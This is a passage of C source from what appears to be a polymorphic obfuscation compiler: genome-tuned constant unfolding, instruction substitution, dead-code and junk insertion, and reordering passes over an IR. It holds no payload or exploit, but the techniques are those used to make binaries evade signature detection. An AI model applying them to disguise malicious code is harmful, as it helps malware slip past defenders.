    fprintf(f, "  \"dead_block_pct\": %d,\n", g->dead_block_pct);
    fprintf(f, "  \"dead_instr_pct\": %d,\n", g->dead_instr_pct);
    fprintf(f, "  \"opaque_pct\": %d,\n", g->opaque_pct);
    fprintf(f, "  \"opaque_weights\": [%d, %d, %d],\n", g->opaque_weights[0], g->opaque_weights[1], g->opaque_weights[2]);
    fprintf(f, "  \"junk_call_block_pct\": %d,\n", g->junk_call_block_pct);
    fprintf(f, "  \"junk_call_instr_pct\": %d,\n", g->junk_call_instr_pct);
    fprintf(f, "  \"harmless_block_pct\": %d,\n", g->harmless_block_pct);
    fprintf(f, "  \"harmless_instr_pct\": %d,\n", g->harmless_instr_pct);
    fprintf(f, "  \"junk_func_pct\": %d,\n", g->junk_func_pct);
    fprintf(f, "  \"expression_flags\": %d,\n", g->expression_flags);
    fprintf(f, "  \"expression_rate\": %d,\n", g->expression_rate);
    fprintf(f, "  \"reorder_instrs_intensity\": %d,\n", g->reorder_instrs_intensity);
    fprintf(f, "  \"reorder_locals_chance\": %d,\n", g->reorder_locals_chance);
    fprintf(f, "  \"reorder_blocks_chance\": %d,\n", g->reorder_blocks_chance);
    fprintf(f, "  \"reorder_funcs_chance\": %d,\n", g->reorder_funcs_chance);
    fprintf(f, "  \"genome_temperature\": %d\n", g_genome_temperature);
    fprintf(f, "}\n");
    fclose(f);
}

// Helper: global genome pointer (set once in main, read everywhere)
static struct Genome g_genome;
static struct Genome* g_genome_ptr = NULL;

// Helper to get genome (never NULL)
static struct Genome* get_genome(void) {
    return g_genome_ptr ? g_genome_ptr : &g_genome;
}

// =============================================================================
// Genome binary serialization (for embedding in standalone bundle outputs)
// Format: "GENE"(4) + version(2) + reserved(2) + N x int16 gene values
// =============================================================================

// Serialize genome to a binary buffer. Returns a malloc'd buffer, sets *out_size.
char* genome_to_binary(struct Genome* g, int* out_size) {
    int size = 4 + 2 + 2 + GENOME_GENE_COUNT * 2;  // header(8) + genes
    char* buf = (char*)malloc(size);
    char* p = buf;

    // Magic "GENE"
    *p++ = 'G'; *p++ = 'E'; *p++ = 'N'; *p++ = 'E';
    // Version (little-endian u16)
    *p++ = GENOME_BINARY_VERSION & 0xFF; *p++ = (GENOME_BINARY_VERSION >> 8) & 0xFF;
    // Temperature (byte 6) + reserved (byte 7)
    *p++ = (char)(g_genome_temperature & 0xFF); *p++ = 0;

    // Helper macro: write int as int16 (little-endian)
    #define W16(val) do { int _v = (val); *p++ = _v & 0xFF; *p++ = (_v >> 8) & 0xFF; } while(0)

    // IR genes (7 scalars + 4+4 weights = 15 values)
    W16(g->unfold_chance);
    for (int i = 0; i < 4; i++) W16(g->unfold_weights[i]);
    W16(g->substitute_chance);
    W16(g->dead_code_chance);
    for (int i = 0; i < 4; i++) W16(g->dead_code_weights[i]);
    W16(g->nop_chance);
    W16(g->nop_max_count);

    // X86 poly genes (5+4+6+3+3+3+2+8+8 = 42 values)
    for (int i = 0; i < 5; i++) W16(g->add_weights[i]);
    for (int i = 0; i < 4; i++) W16(g->sub_weights[i]);
    for (int i = 0; i < 6; i++) W16(g->movi_weights[i]);
    for (int i = 0; i < 3; i++) W16(g->movi_zero_weights[i]);
    for (int i = 0; i < 3; i++) W16(g->movi_neg1_weights[i]);
    for (int i = 0; i < 3; i++) W16(g->xor_weights[i]);
    for (int i = 0; i < 2; i++) W16(g->cmp_weights[i]);
    for (int i = 0; i < 8; i++) W16(g->junk_seq_weights[i]);

    // X86 transform genes (9 scalars + opaque_weights[3] + junk_func_pct = 12 values)
    W16(g->dead_prologue_pct);
    W16(g->dead_block_pct);
    W16(g->dead_instr_pct);
    W16(g->opaque_pct);
    for (int i = 0; i < 3; i++) W16(g->opaque_weights[i]);
    W16(g->junk_call_block_pct);
    W16(g->junk_call_instr_pct);
    W16(g->harmless_block_pct);
    W16(g->harmless_instr_pct);
    W16(g->junk_func_pct);

    // Gene expression (2 values)
    W16(g->expression_flags);
    W16(g->expression_rate);

    // Reorder genes (4 values)
    W16(g->reorder_instrs_intensity);
    W16(g->reorder_locals_chance);
    W16(g->reorder_blocks_chance);
    W16(g->reorder_funcs_chance);

    #undef W16

    *out_size = (int)(p - buf);
    return buf;
}

// Deserialize genome from binary buffer. Returns default genome on error.
// Also reads temperature from byte 6 into g_genome_temperature.
struct Genome genome_from_binary(const char* buf, int size) {
    struct Genome g = default_genome();
    if (size < 8) return g;
    if (buf[0] != 'G' || buf[1] != 'E' || buf[2] != 'N' || buf[3] != 'E') return g;

    // Read temperature from byte 6
    g_genome_temperature = clamp_temperature((unsigned char)buf[6]);

    const char* p = buf + 8;  // skip magic + version + temperature + reserved
    const char* end = buf + size;

    #define R16() (p + 2 <= end ? (p += 2, (int)(short)((unsigned char)p[-2] | ((unsigned char)p[-1] << 8))) : 0)

    // IR genes
    g.unfold_chance = R16();
    for (int i = 0; i < 4; i++) g.unfold_weights[i] = R16();
    g.substitute_chance = R16();
    g.dead_code_chance = R16();
    for (int i = 0; i < 4; i++) g.dead_code_weights[i] = R16();
    g.nop_chance = R16();
    g.nop_max_count = R16();

    // X86 poly genes
    for (int i = 0; i < 5; i++) g.add_weights[i] = R16();
    for (int i = 0; i < 4; i++) g.sub_weights[i] = R16();
    for (int i = 0; i < 6; i++) g.movi_weights[i] = R16();
    for (int i = 0; i < 3; i++) g.movi_zero_weights[i] = R16();
    for (int i = 0; i < 3; i++) g.movi_neg1_weights[i] = R16();
    for (int i = 0; i < 3; i++) g.xor_weights[i] = R16();
    for (int i = 0; i < 2; i++) g.cmp_weights[i] = R16();
    for (int i = 0; i < 8; i++) g.junk_seq_weights[i] = R16();

    // X86 transform genes
    g.dead_prologue_pct = R16();
    g.dead_block_pct = R16();
    g.dead_instr_pct = R16();
    g.opaque_pct = R16();
    for (int i = 0; i < 3; i++) g.opaque_weights[i] = R16();
    g.junk_call_block_pct = R16();
    g.junk_call_instr_pct = R16();
    g.harmless_block_pct = R16();
    g.harmless_instr_pct = R16();
    g.junk_func_pct = R16();

    // Gene expression (v2+); v1 genomes will get defaults from default_genome()
    if (p + 4 <= end) {
        g.expression_flags = R16();
        g.expression_rate = R16();
    }

    // Reorder genes (v2+, indices 69-72); old genomes keep defaults
    if (p + 8 <= end) {
        g.reorder_instrs_intensity = R16();
        g.reorder_locals_chance = R16();
        g.reorder_blocks_chance = R16();
        g.reorder_funcs_chance = R16();
    }

    #undef R16
    return g;
}
// =============================================================================
//
// IR Module
//
// Contains the following sections:
//   1. IR data structures (Operand, Instruction, Block, Function, Module)
//   2. IR helpers (make_instr, make_operand, block_insert_instrs, ...)
//   3. Transform config (TransformConfig + default_transform_config)
//   4. IR optimization passes (fold/compact/remove_nops + transforms)
//
// =============================================================================

// =============================================================================
// IR Data Structures
// =============================================================================

struct Operand {
    int kind;
    int index;
    int value;
};

struct Instruction {
    int opcode;
    struct Operand dest;
    struct Operand src1;
    struct Operand src2;
    int type_code;
    int target_block;
    int func_idx;
    int arg_count;
    struct Operand* args;
    int offset;
    int elem_size;
    // For OP_EMIT: inline raw bytes
    int raw_count;
    unsigned char* raw_bytes;
};

struct Block {
    char* label;
    struct Instruction* instrs;
    int instr_count;
};

struct Function {
    char* name;
    int name_idx;
    int return_type;
    int* param_types;
    int param_count;
    int* local_types;
    int* local_sizes;
    int local_count;
    struct Block* blocks;
    int block_count;
    int temp_count;
    int dll_idx;      // DLL name string index (0 = no DLL, >0 = DLL name)
    char* dll_name;   // DLL name string (for user externs)
    int api_slot;     // Original function index (for API table access after reorder)
};

struct Global {
    char* name;
    int name_idx;
    int type_code;
    int size;
    int init_kind;
    int init_value;
};

struct Module {
    char** strings;
    int string_count;
    struct Global* globals;
    int global_count;
    struct Function* funcs;
    int func_count;
    int entry_func;
};


// Helper to create a new instruction
struct Instruction make_instr(int opcode) {
    struct Instruction ins;
    memset(&ins, 0, sizeof(ins));
    ins.opcode = opcode;
    return ins;
}

// Helper to make an operand
struct Operand make_operand(int kind, int index) {
    struct Operand op;
    op.kind = kind;
    op.index = index;
    op.value = 0;
    return op;
}

struct Operand make_const_op(int val) {
    struct Operand op;
    op.kind = VK_CONST;
    op.index = 0;
    op.value = val;
    return op;
}

// Insert instructions into a block, growing the array
void block_insert_instrs(struct Block* blk, int at, struct Instruction* new_instrs, int count) {
    int new_count = blk->instr_count + count;
    struct Instruction* new_arr = (struct Instruction*)malloc(sizeof(struct Instruction) * (new_count + 1));

    // Copy before insertion point
    for (int i = 0; i < at; i++) {
        new_arr[i] = blk->instrs[i];
    }
    // Copy new instructions
    for (int i = 0; i < count; i++) {
        new_arr[at + i] = new_instrs[i];
    }
    // Copy after insertion point
    for (int i = at; i < blk->instr_count; i++) {
        new_arr[i + count] = blk->instrs[i];
    }

    free(blk->instrs);
    blk->instrs = new_arr;
    blk->instr_count = new_count;
}

// Remove instruction at index idx from a block, shifting remaining left
void block_remove_instr(struct Block* blk, int idx) {
    for (int i = idx; i < blk->instr_count - 1; i++) {
        blk->instrs[i] = blk->instrs[i + 1];
    }
    blk->instr_count--;
}

// =============================================================================
// IR Transformations (Bytecode-level polymorphism)
// =============================================================================

// Configuration for IR transformations
struct TransformConfig {
    int dead_code_chance;       // % chance to insert dead code (0-100)
    int constant_unfold_chance; // % chance to unfold constants
    int instr_sub_chance;       // % chance to substitute instructions
    int nop_insert_chance;      // % chance to insert NOPs
    // Flags to enable/disable specific transforms
    int enable_unfold;
    int enable_substitute;
    int enable_dead_code;
    int enable_nops;
    int enable_reorder;
    int enable_reorder_locals;
    int enable_reorder_funcs;
    int enable_reorder_instrs;
};

struct TransformConfig default_transform_config() {
    struct TransformConfig cfg;
    cfg.dead_code_chance = 25;
    cfg.constant_unfold_chance = 35;
    cfg.instr_sub_chance = 40;
    cfg.nop_insert_chance = 20;
    cfg.enable_unfold = 1;
    cfg.enable_substitute = 1;
    cfg.enable_dead_code = 1;
    cfg.enable_nops = 1;
    cfg.enable_reorder = 1;
    cfg.enable_reorder_locals = 1;
    cfg.enable_reorder_funcs = 0;
    cfg.enable_reorder_instrs = 1;
    return cfg;
}

// =============================================================================
// IR Optimization (reverse of expansion transforms)
// =============================================================================

// Optimize: fold CONST a; CONST b; ADD/SUB/XOR -> CONST result
void optimize_fold_constants(struct Function* func) {
    if (func->block_count == 0) return;

    // Build use_count for all temps
    int* use_count = (int*)calloc(func->temp_count, sizeof(int));

    for (int b = 0; b < func->block_count; b++) {
        struct Block* blk = &func->blocks[b];
        for (int i = 0; i < blk->instr_count; i++) {
            struct Instruction* ins = &blk->instrs[i];
            if (ins->src1.kind == VK_TEMP) use_count[ins->src1.index]++;
            if (ins->src2.kind == VK_TEMP) use_count[ins->src2.index]++;
            if (ins->opcode == OP_CALL || ins->opcode == OP_CALLV ||
                ins->opcode == OP_ICALL || ins->opcode == OP_ICALLV ||
                ins->opcode == OP_SYSCALL) {
                for (int a = 0; a < ins->arg_count; a++) {
                    if (ins->args[a].kind == VK_TEMP) use_count[ins->args[a].index]++;
                }
            }
        }
    }

    // Pass 1: adjacent triple pattern (CONST, CONST, ADD/SUB/XOR)
    for (int b = 0; b < func->block_count; b++) {
        struct Block* blk = &func->blocks[b];
        int i = 0;
        while (i + 2 < blk->instr_count) {
            struct Instruction* i0 = &blk->instrs[i];
            struct Instruction* i1 = &blk->instrs[i + 1];
            struct Instruction* i2 = &blk->instrs[i + 2];

            if (i0->opcode == OP_CONST && i0->dest.kind == VK_TEMP &&
                i1->opcode == OP_CONST && i1->dest.kind == VK_TEMP &&
                (i2->opcode == OP_ADD || i2->opcode == OP_SUB || i2->opcode == OP_XOR) &&
                i2->src1.kind == i0->dest.kind && i2->src1.index == i0->dest.index &&
                i2->src2.kind == i1->dest.kind && i2->src2.index == i1->dest.index &&
                use_count[i0->dest.index] == 1 && use_count[i1->dest.index] == 1) {

                int a = i0->src1.value;
                int b_val = i1->src1.value;
                int result;
                if (i2->opcode == OP_ADD) result = a + b_val;
                else if (i2->opcode == OP_SUB) result = a - b_val;
                else result = a ^ b_val;

                // Overwrite i0 as CONST dest, result
                i0->opcode = OP_CONST;
                i0->dest = i2->dest;
                i0->src1.kind = VK_CONST;
                i0->src1.index = 0;
                i0->src1.value = result;
                i0->src2.kind = 0;
                i0->src2.index = 0;
                i0->src2.value = 0;
                i0->type_code = i2->type_code;

                block_remove_instr(blk, i + 1);
                block_remove_instr(blk, i + 1);
                // Don't advance i - recheck
            } else {
                i++;
            }
        }
    }

    // Pass 2: non-adjacent fold (handles scheduling-separated unfold patterns)
    for (int b = 0; b < func->block_count; b++) {
        struct Block* blk = &func->blocks[b];
        for (int i = 0; i < blk->instr_count; i++) {
            struct Instruction* ins = &blk->instrs[i];
            if ((ins->opcode == OP_ADD || ins->opcode == OP_SUB || ins->opcode == OP_XOR) &&
                ins->src1.kind == VK_TEMP && ins->src2.kind == VK_TEMP &&
                use_count[ins->src1.index] == 1 && use_count[ins->src2.index] == 1) {
                int s1_idx = ins->src1.index;
                int s2_idx = ins->src2.index;
                int s1_pos = -1, s2_pos = -1;
                for (int j = 0; j < i; j++) {
                    if (blk->instrs[j].opcode == OP_CONST && blk->instrs[j].dest.kind == VK_TEMP) {
                        if (blk->instrs[j].dest.index == s1_idx) s1_pos = j;
                        if (blk->instrs[j].dest.index == s2_idx) s2_pos = j;
                    }
                }
                if (s1_pos >= 0 && s2_pos >= 0) {
                    int a = blk->instrs[s1_pos].src1.value;
                    int bv = blk->instrs[s2_pos].src1.value;
                    int result;
                    if (ins->opcode == OP_ADD) result = a + bv;
                    else if (ins->opcode == OP_SUB) result = a - bv;
                    else result = a ^ bv;
                    ins->opcode = OP_CONST;
                    ins->src1.kind = VK_CONST;
                    ins->src1.index = 0;
                    ins->src1.value = result;
                    ins->src2.kind = 0;
                    ins->src2.index = 0;
                    ins->src2.value = 0;
                    blk->instrs[s1_pos].opcode = OP_NOP;
                    blk->instrs[s2_pos].opcode = OP_NOP;
                }
            }
        }
    }

    free(use_count);
}

// Optimize: remove dead code (unused temp defs with no side effects)
void optimize_remove_dead_code(struct Function* func) {
    if (func->block_count == 0) return;

    // Build used[] for all temps
    int* used = (int*)calloc(func->temp_count, sizeof(int));

    for (int b = 0; b < func->block_count; b++) {
        struct Block* blk = &func->blocks[b];
        for (int i = 0; i < blk->instr_count; i++) {
            struct Instruction* ins = &blk->instrs[i];
            if (ins->src1.kind == VK_TEMP) used[ins->src1.index] = 1;
            if (ins->src2.kind == VK_TEMP) used[ins->src2.index] = 1;
            // STORE uses dest as source (the address to store to)
            if (ins->opcode == OP_STORE && ins->dest.kind == VK_TEMP) used[ins->dest.index] = 1;
            if (ins->opcode == OP_CALL || ins->opcode == OP_CALLV ||
                ins->opcode == OP_ICALL || ins->opcode == OP_ICALLV ||
                ins->opcode == OP_SYSCALL) {
                for (int a = 0; a < ins->arg_count; a++) {
                    if (ins->args[a].kind == VK_TEMP) used[ins->args[a].index] = 1;
                }
            }
        }
    }

    for (int b = 0; b < func->block_count; b++) {
        struct Block* blk = &func->blocks[b];
        int i = blk->instr_count - 1;
        while (i >= 0) {
            struct Instruction* ins = &blk->instrs[i];
            if (ins->dest.kind == VK_TEMP && used[ins->dest.index] == 0) {
                int op = ins->opcode;
                if (op == OP_NOP || op == OP_CONST || op == OP_COPY ||
                    op == OP_ADD || op == OP_SUB || op == OP_MUL || op == OP_DIV ||
                    op == OP_MOD || op == OP_NEG ||
                    op == OP_AND || op == OP_OR || op == OP_XOR || op == OP_NOT ||
                    op == OP_SHL || op == OP_SHR ||
                    op == OP_EQ || op == OP_NE || op == OP_LT || op == OP_LE ||
                    op == OP_GT || op == OP_GE || op == OP_PTRADD ||
                    op == OP_FUNC_ADDR) {
                    block_remove_instr(blk, i);
                }
            }
            i--;
        }
    }

    free(used);
}

// Optimize: compact temp indices to remove gaps left by dead code removal
void optimize_compact_temps(struct Function* func) {
    if (func->block_count == 0 || func->temp_count == 0) return;

    // Build mapping: old temp index -> new contiguous index
    int* mapping = (int*)malloc(sizeof(int) * func->temp_count);
    for (int i = 0; i < func->temp_count; i++) mapping[i] = -1;

    // Mark all referenced temp indices
    for (int b = 0; b < func->block_count; b++) {
        struct Block* blk = &func->blocks[b];
        for (int i = 0; i < blk->instr_count; i++) {
            struct Instruction* ins = &blk->instrs[i];
            if (ins->dest.kind == VK_TEMP) mapping[ins->dest.index] = 0;
            if (ins->src1.kind == VK_TEMP) mapping[ins->src1.index] = 0;
            if (ins->src2.kind == VK_TEMP) mapping[ins->src2.index] = 0;
            if (ins->opcode == OP_CALL || ins->opcode == OP_CALLV ||
                ins->opcode == OP_ICALL || ins->opcode == OP_ICALLV ||
                ins->opcode == OP_SYSCALL) {
                for (int a = 0; a < ins->arg_count; a++) {
                    if (ins->args[a].kind == VK_TEMP) mapping[ins->args[a].index] = 0;
                }
            }
        }
    }

    // Assign contiguous indices
    int next = 0;
    for (int i = 0; i < func->temp_count; i++) {
        if (mapping[i] == 0) {
            mapping[i] = next++;
        }
    }

    // If nothing changed, skip rewrite
    if (next == func->temp_count) {
        free(mapping);
        return;
    }

    // Apply mapping to all operands
    for (int b = 0; b < func->block_count; b++) {
        struct Block* blk = &func->blocks[b];
        for (int i = 0; i < blk->instr_count; i++) {
            struct Instruction* ins = &blk->instrs[i];
            if (ins->dest.kind == VK_TEMP) ins->dest.index = mapping[ins->dest.index];
            if (ins->src1.kind == VK_TEMP) ins->src1.index = mapping[ins->src1.index];
            if (ins->src2.kind == VK_TEMP) ins->src2.index = mapping[ins->src2.index];
            if (ins->opcode == OP_CALL || ins->opcode == OP_CALLV ||
                ins->opcode == OP_ICALL || ins->opcode == OP_ICALLV ||
                ins->opcode == OP_SYSCALL) {
                for (int a = 0; a < ins->arg_count; a++) {
                    if (ins->args[a].kind == VK_TEMP) ins->args[a].index = mapping[ins->args[a].index];
                }
            }
        }
    }

    func->temp_count = next;
    free(mapping);
}

// Shuffle temp indices randomly (polymorphic temp numbering)
void transform_shuffle_temps(struct Function* func, struct Prng* prng) {
    if (func->block_count == 0 || func->temp_count <= 1) return;
    int n = func->temp_count;

    // Build a random permutation via Fisher-Yates
    int* perm = (int*)malloc(sizeof(int) * n);
    for (int i = 0; i < n; i++) perm[i] = i;
    for (int i = n - 1; i > 0; i--) {
        int j = prng_range(prng, i + 1);
        int tmp = perm[i]; perm[i] = perm[j]; perm[j] = tmp;
    }

    // Apply permutation to all temp operands
    for (int b = 0; b < func->block_count; b++) {
        struct Block* blk = &func->blocks[b];
        for (int i = 0; i < blk->instr_count; i++) {
            struct Instruction* ins = &blk->instrs[i];
            if (ins->dest.kind == VK_TEMP) ins->dest.index = perm[ins->dest.index];
            if (ins->src1.kind == VK_TEMP) ins->src1.index = perm[ins->src1.index];
            if (ins->src2.kind == VK_TEMP) ins->src2.index = perm[ins->src2.index];
            if (ins->opcode == OP_CALL || ins->opcode == OP_CALLV ||
                ins->opcode == OP_ICALL || ins->opcode == OP_ICALLV ||
                ins->opcode == OP_SYSCALL) {
                for (int a = 0; a < ins->arg_count; a++) {
                    if (ins->args[a].kind == VK_TEMP) ins->args[a].index = perm[ins->args[a].index];
                }
            }
        }
    }

    free(perm);
}

// Optimize: remove NOP instructions
void optimize_remove_nops(struct Function* func) {
    if (func->block_count == 0) return;

    for (int b = 0; b < func->block_count; b++) {
        struct Block* blk = &func->blocks[b];
        int i = blk->instr_count - 1;
        while (i >= 0) {
            if (blk->instrs[i].opcode == OP_NOP) {
                block_remove_instr(blk, i);
            }
            i--;
        }
    }
}

// Apply all optimizations to module
void optimize_module(struct Module* mod, int verbose) {
    if (verbose) {
        fprintf(stderr, "Applying IR optimizations (shrink)...\n");
    }

    for (int f = 0; f < mod->func_count; f++) {
        struct Function* func = &mod->funcs[f];
        if (func->block_count == 0) continue;

        int orig_instrs = 0;
        for (int b = 0; b < func->block_count; b++) {
            orig_instrs += func->blocks[b].instr_count;
        }

        // Clean up cruft but preserve transform work (unfold/substitute survive)
        int changed = 1;
        while (changed) {
            int before = 0;
            for (int b2 = 0; b2 < func->block_count; b2++) {
                before += func->blocks[b2].instr_count;
            }
            optimize_remove_nops(func);
            optimize_remove_dead_code(func);
            int after = 0;
            for (int b2 = 0; b2 < func->block_count; b2++) {
                after += func->blocks[b2].instr_count;
            }
            changed = (after < before);
        }

        // Compact temp indices to close gaps from removed dead code
        optimize_compact_temps(func);

        if (verbose) {
            int new_instrs = 0;
            for (int b = 0; b < func->block_count; b++) {
                new_instrs += func->blocks[b].instr_count;
            }
            if (new_instrs != orig_instrs) {
                fprintf(stderr, "  opt %s: %d -> %d instrs\n", func->name, orig_instrs, new_instrs);
            }
        }
    }
}

// Apply optimizations stochastically (second pass after transforms).
// Each shrink pass runs with 50% probability so transforms partially survive.
// optimize_compact_temps always runs — required for codegen correctness.
void optimize_module_random(struct Module* mod, struct Prng* prng, int verbose) {
    if (verbose) {
        fprintf(stderr, "Applying IR optimizations (random)...\n");
    }

    for (int f = 0; f < mod->func_count; f++) {
        struct Function* func = &mod->funcs[f];
        if (func->block_count == 0) continue;

        int orig_instrs = 0;
        for (int b = 0; b < func->block_count; b++) {
            orig_instrs += func->blocks[b].instr_count;
        }

        // Stochastic cleanup: each pass has 50% chance of running.
        // Keeps some inserted nops/dead code alive for polymorphism.
        int changed = 1;
        while (changed) {
            int before = 0;
            for (int b2 = 0; b2 < func->block_count; b2++) {
                before += func->blocks[b2].instr_count;
            }
            if (prng_range(prng, 2)) optimize_remove_nops(func);
            if (prng_range(prng, 2)) optimize_remove_dead_code(func);
            int after = 0;
            for (int b2 = 0; b2 < func->block_count; b2++) {
                after += func->blocks[b2].instr_count;
            }
            changed = (after < before);
        }

        // fold_constants gets a single 50% roll OUTSIDE the loop.
        // Inside the loop it fires near-certainly (loop repeats until
        // convergence), completely reversing unfold/substitute work.
        if (prng_range(prng, 2)) {
            optimize_fold_constants(func);
        }

        optimize_compact_temps(func);

        if (verbose) {
            int new_instrs = 0;
            for (int b = 0; b < func->block_count; b++) {
                new_instrs += func->blocks[b].instr_count;
            }
            if (new_instrs != orig_instrs) {
                fprintf(stderr, "  ropt %s: %d -> %d instrs\n", func->name, orig_instrs, new_instrs);
            }
        }
    }
}

// Global debug flag for transform tracing
static int g_transform_debug = 0;

// Transform: Constant unfolding
// CONST t, val -> CONST t1, a; CONST t2, b; ADD/SUB/XOR t, t1, t2
void transform_unfold_constants(struct Function* func, struct Prng* prng, struct TransformConfig* cfg) {
    if (func->block_count == 0) return;

    int temp_base = func->temp_count;
    if (g_transform_debug) {
        fprintf(stderr, "[unfold] %s: starting with temp_count=%d\n", func->name, temp_base);
    }

    for (int b = 0; b < func->block_count; b++) {
        struct Block* blk = &func->blocks[b];
        int i = 0;

        while (i < blk->instr_count) {
            struct Instruction* ins = &blk->instrs[i];

            if (ins->opcode == OP_CONST && prng_range(prng, 100) < get_genome()->unfold_chance) {
                int val = ins->src1.value;
                int tc = ins->type_code;
                struct Operand dest = ins->dest;

                int strategy = genome_pick(get_genome()->unfold_weights, 4, prng);

                if (strategy == 0 && val > 1) {
                    // Split into addition: a + b = val
                    int a = prng_range(prng, val);
                    int b_val = val - a;
                    if (g_transform_debug) {
                        fprintf(stderr, "[unfold] strategy=ADD: val=%d -> %d+%d, dest.kind=%d dest.idx=%d, new temps t%d,t%d\n",
                                val, a, b_val, dest.kind, dest.index, temp_base, temp_base+1);
                    }

                    int t1 = temp_base++;
                    int t2 = temp_base++;

                    struct Instruction new_instrs[3];
                    new_instrs[0] = make_instr(OP_CONST);
                    new_instrs[0].dest = make_operand(VK_TEMP, t1);
                    new_instrs[0].src1 = make_const_op(a);
                    new_instrs[0].type_code = tc;

                    new_instrs[1] = make_instr(OP_CONST);
                    new_instrs[1].dest = make_operand(VK_TEMP, t2);
                    new_instrs[1].src1 = make_const_op(b_val);
                    new_instrs[1].type_code = tc;

                    new_instrs[2] = make_instr(OP_ADD);
                    new_instrs[2].dest = dest;
                    new_instrs[2].src1 = make_operand(VK_TEMP, t1);
                    new_instrs[2].src2 = make_operand(VK_TEMP, t2);
                    new_instrs[2].type_code = tc;

                    // Replace instruction at i
                    blk->instrs[i] = new_instrs[0];
                    // Insert remaining 2 after
                    block_insert_instrs(blk, i + 1, &new_instrs[1], 2);
                    i += 3;
                    continue;

                } else if (strategy == 1 && val != 0) {
                    // XOR unfold: (val ^ r) ^ r = val
                    int r = prng_range(prng, 0x7FFF) + 1;
                    int xored = val ^ r;

                    int t1 = temp_base++;
                    int t2 = temp_base++;

                    struct Instruction new_instrs[3];
                    new_instrs[0] = make_instr(OP_CONST);
                    new_instrs[0].dest = make_operand(VK_TEMP, t1);
                    new_instrs[0].src1 = make_const_op(xored);
                    new_instrs[0].type_code = tc;

                    new_instrs[1] = make_instr(OP_CONST);
                    new_instrs[1].dest = make_operand(VK_TEMP, t2);
                    new_instrs[1].src1 = make_const_op(r);
                    new_instrs[1].type_code = tc;

                    new_instrs[2] = make_instr(OP_XOR);
                    new_instrs[2].dest = dest;
                    new_instrs[2].src1 = make_operand(VK_TEMP, t1);
                    new_instrs[2].src2 = make_operand(VK_TEMP, t2);
                    new_instrs[2].type_code = tc;

                    blk->instrs[i] = new_instrs[0];
                    block_insert_instrs(blk, i + 1, &new_instrs[1], 2);
                    i += 3;
                    continue;

                } else if (strategy == 2) {
                    // Subtraction: (val + r) - r = val
                    int r = prng_range(prng, 100) + 1;

                    int t1 = temp_base++;
                    int t2 = temp_base++;

                    struct Instruction new_instrs[3];
                    new_instrs[0] = make_instr(OP_CONST);
                    new_instrs[0].dest = make_operand(VK_TEMP, t1);
                    new_instrs[0].src1 = make_const_op(val + r);
                    new_instrs[0].type_code = tc;

                    new_instrs[1] = make_instr(OP_CONST);
                    new_instrs[1].dest = make_operand(VK_TEMP, t2);
                    new_instrs[1].src1 = make_const_op(r);
                    new_instrs[1].type_code = tc;

                    new_instrs[2] = make_instr(OP_SUB);
                    new_instrs[2].dest = dest;
                    new_instrs[2].src1 = make_operand(VK_TEMP, t1);
                    new_instrs[2].src2 = make_operand(VK_TEMP, t2);
                    new_instrs[2].type_code = tc;

                    blk->instrs[i] = new_instrs[0];
                    block_insert_instrs(blk, i + 1, &new_instrs[1], 2);
                    i += 3;
                    continue;
                }
            }
            i++;
        }
    }

    if (g_transform_debug) {
        fprintf(stderr, "[unfold] %s: ended with temp_count=%d\n", func->name, temp_base);
    }
    func->temp_count = temp_base;
}

// Transform: Instruction substitution
// ADD x, y where y is const -> SUB x, -y
// SUB x, y where y is const -> ADD x, -y
// MUL x, 2^n -> SHL x, n
void transform_substitute_instrs(struct Function* func, struct Prng* prng, struct TransformConfig* cfg) {
    if (func->block_count == 0) return;

    for (int b = 0; b < func->block_count; b++) {
        struct Block* blk = &func->blocks[b];

        for (int i = 0; i < blk->instr_count; i++) {
            struct Instruction* ins = &blk->instrs[i];

            if (prng_range(prng, 100) >= get_genome()->substitute_chance) continue;

            // ADD with const -> SUB with negated
            if (ins->opcode == OP_ADD && ins->src2.kind == VK_CONST) {
                ins->opcode = OP_SUB;
                ins->src2.value = -ins->src2.value;
            }
            // SUB with const -> ADD with negated
            else if (ins->opcode == OP_SUB && ins->src2.kind == VK_CONST) {
                ins->opcode = OP_ADD;
                ins->src2.value = -ins->src2.value;
            }
            // MUL by power of 2 -> SHL
            else if (ins->opcode == OP_MUL && ins->src2.kind == VK_CONST) {
                int val = ins->src2.value;
                if (val > 0 && (val & (val - 1)) == 0) {
                    int shift = 0;
                    while ((1 << shift) < val) shift++;
                    ins->opcode = OP_SHL;
                    ins->src2.value = shift;
                }
            }
        }
    }
}

// Transform: Dead code insertion
// Insert computations on unused temps
void transform_insert_dead_code(struct Function* func, struct Prng* prng, struct TransformConfig* cfg) {
    if (func->block_count == 0) return;

    int temp_base = func->temp_count;
    if (g_transform_debug) {
        fprintf(stderr, "[deadcode] %s: starting with temp_count=%d\n", func->name, temp_base);
    }

    for (int b = 0; b < func->block_count; b++) {
        struct Block* blk = &func->blocks[b];
        int i = 0;

        while (i < blk->instr_count) {
            if (prng_range(prng, 100) < get_genome()->dead_code_chance) {
                int kind = genome_pick(get_genome()->dead_code_weights, 4, prng);
                struct Instruction new_instrs[4];
                int count = 0;

                if (kind == 0) {
                    // Dead constant
                    int t = temp_base++;
                    new_instrs[0] = make_instr(OP_CONST);
                    new_instrs[0].dest = make_operand(VK_TEMP, t);
                    new_instrs[0].src1 = make_const_op(prng_range(prng, 1000));
                    new_instrs[0].type_code = TC_I32;
                    count = 1;

                } else if (kind == 1) {
                    // Dead add
                    int t1 = temp_base++;
                    int t2 = temp_base++;
                    int t3 = temp_base++;

                    new_instrs[0] = make_instr(OP_CONST);
                    new_instrs[0].dest = make_operand(VK_TEMP, t1);
                    new_instrs[0].src1 = make_const_op(prng_range(prng, 100));
                    new_instrs[0].type_code = TC_I32;

                    new_instrs[1] = make_instr(OP_CONST);
                    new_instrs[1].dest = make_operand(VK_TEMP, t2);
                    new_instrs[1].src1 = make_const_op(prng_range(prng, 100));
                    new_instrs[1].type_code = TC_I32;

                    new_instrs[2] = make_instr(OP_ADD);
                    new_instrs[2].dest = make_operand(VK_TEMP, t3);
                    new_instrs[2].src1 = make_operand(VK_TEMP, t1);
                    new_instrs[2].src2 = make_operand(VK_TEMP, t2);
                    new_instrs[2].type_code = TC_I32;
                    count = 3;

                } else if (kind == 2) {
                    // Dead XOR (result is always 0)
                    int t1 = temp_base++;
                    int t2 = temp_base++;

                    new_instrs[0] = make_instr(OP_CONST);
                    new_instrs[0].dest = make_operand(VK_TEMP, t1);
                    new_instrs[0].src1 = make_const_op(prng_range(prng, 0xFFFF));
                    new_instrs[0].type_code = TC_I32;

                    new_instrs[1] = make_instr(OP_XOR);
                    new_instrs[1].dest = make_operand(VK_TEMP, t2);
